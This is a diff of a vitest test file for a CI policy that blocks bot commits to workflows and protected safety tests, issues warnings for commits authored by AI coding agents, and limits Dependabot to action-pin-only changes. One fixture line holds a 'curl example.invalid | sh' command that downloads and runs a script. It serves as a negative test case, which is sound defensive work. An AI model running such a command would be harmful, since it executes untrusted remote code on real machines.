@@ -1,6 +1,8 @@
 import { describe, expect, it } from "vitest";
 import {
+  agentSensitiveCommitWarnings,
   botSensitiveCommitViolations,
+  isAgentAuthor,
   isBotAuthor,
   isSensitivePath,
 } from "../scripts/ward-ci-public/bot-author-policy.mjs";
@@ -75,8 +77,107 @@ describe("bot-author PR policy", () => {
     ).toEqual([]);
   });
 
+  it("lets Dependabot change workflow action pins only", async () => {
+    const { isActionPinOnlyPatch } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
+    const pin = [
+      "@@ -10,7 +10,7 @@ jobs:",
+      "     steps:",
+      "-      - uses: actions/checkout@" + "a".repeat(40) + " # v4.1.0",
+      "+      - uses: actions/checkout@" + "b".repeat(40) + " # v4.2.0",
+    ].join("\n");
+    const edit = pin + "\n+        run: curl example.invalid | sh";
+    expect(isActionPinOnlyPatch(pin)).toBe(true);
+    expect(isActionPinOnlyPatch(edit)).toBe(false);
+    expect(isActionPinOnlyPatch(undefined)).toBe(false);
+    const workflow = ".github/workflows/ward-flow.yml";
+    const dependabot = { login: "dependabot[bot]" };
+    expect(
+      botSensitiveCommitViolations([
+        { sha: "f".repeat(40), author: dependabot, files: [workflow], actionPinOnlyFiles: [workflow] },
+      ]),
+    ).toEqual([]);
+    expect(botSensitiveCommitViolations([{ sha: "f".repeat(40), author: dependabot, files: [workflow] }])).toHaveLength(
+      1,
+    );
+    // Only Dependabot gets the exemption, and only for workflow files.
+    expect(
+      botSensitiveCommitViolations([
+        { sha: "f".repeat(40), author: bot, files: [workflow], actionPinOnlyFiles: [workflow] },
+        {
+          sha: "0".repeat(40),
+          author: dependabot,
+          files: ["scripts/ward-ci-public/plan.mjs"],
+          actionPinOnlyFiles: ["scripts/ward-ci-public/plan.mjs"],
+        },
+      ]),
+    ).toHaveLength(2);
+  });
+
   it("fails closed when a bot commit's files are unknown", () => {
     expect(botSensitiveCommitViolations([{ sha: "e".repeat(40), author: bot }])[0]).toMatch(/failing closed/);
+  });
+});
+
+describe("bot-author PR policy: coding-agent warn tier (A6-F02)", () => {
+  const claude = { login: "claude", email: "noreply@anthropic.com" };
+
+  it("recognises coding agents without moving bots out of the failing tier", () => {
+    expect(isAgentAuthor(claude)).toBe(true);
+    expect(isAgentAuthor({ login: "", email: "noreply@anthropic.com" })).toBe(true);
+    expect(isAgentAuthor({ login: "CursorAgent" })).toBe(true);
+    expect(isAgentAuthor({ email: "cursoragent@cursor.com" })).toBe(true);
+    expect(isAgentAuthor({ login: "codex" })).toBe(true);
+    expect(isAgentAuthor({ login: "chatgpt-codex-connector" })).toBe(true);
+    expect(isBotAuthor(claude)).toBe(false);
+    for (const login of ["cursor[bot]", "chatgpt-codex-connector[bot]", "copilot-swe-agent"]) {
+      expect(isBotAuthor({ login }), login).toBe(true);
+      expect(isAgentAuthor({ login }), login).toBe(false);
+    }
+    expect(isAgentAuthor(human)).toBe(false);
+    expect(isAgentAuthor(undefined)).toBe(false);
+  });
+
+  it("protects workflows, public CI scripts and the protected safety tests", () => {
+    for (const file of [
+      ".github/workflows/ward-flow.yml",
+      "scripts/ward-ci-public/plan.mjs",
+      "scripts/ward-ci-public/bot-author-policy.mjs",
+      "scripts/ward-flow/protected-safety-tests.json",
+      "tests/ward-engine-safety.test.ts",
+      "tests/ward-permission-matrix.test.ts",
+    ]) {
+      expect(isSensitivePath(file), file).toBe(true);
+    }
+    for (const file of [".github/dependabot.yml", "scripts/ward-flow/other.json", "tests/ward-engine.test.ts"]) {
+      expect(isSensitivePath(file), file).toBe(false);
+    }
+  });
+
+  it("warns, but does not fail, on an agent commit touching the engine", () => {
+    const commits = [{ sha: "f".repeat(40), author: claude, files: ["backend/ward-flow/engine.ts"] }];
+    expect(botSensitiveCommitViolations(commits)).toEqual([]);
+    const warnings = agentSensitiveCommitWarnings(commits);
+    expect(warnings).toHaveLength(1);
+    expect(warnings[0]).toMatch(/Agent-authored commit f{12} \(claude\).*engine\.ts.*Warning only/);
+  });
+
+  it("fails a bot commit touching a workflow", () => {
+    const commits = [{ sha: "1".repeat(40), author: bot, files: [".github/workflows/ward-flow.yml"] }];
+    expect(botSensitiveCommitViolations(commits)).toHaveLength(1);
+    expect(agentSensitiveCommitWarnings(commits)).toEqual([]);
+  });
+
+  it("says nothing about a human commit on the same paths", () => {
+    const commits = [
+      { sha: "2".repeat(40), author: human, files: ["backend/ward-flow/engine.ts", ".github/workflows/ward-flow.yml"] },
+    ];
+    expect(botSensitiveCommitViolations(commits)).toEqual([]);
+    expect(agentSensitiveCommitWarnings(commits)).toEqual([]);
+  });
+
+  it("warns (not fails) when an agent commit's files are unknown, and ignores unprotected agent work", () => {
+    expect(agentSensitiveCommitWarnings([{ sha: "3".repeat(40), author: claude }])[0]).toMatch(/review it by hand/);
+    expect(agentSensitiveCommitWarnings([{ sha: "4".repeat(40), author: claude, files: ["README.md"] }])).toEqual([]);
   });
 });
 
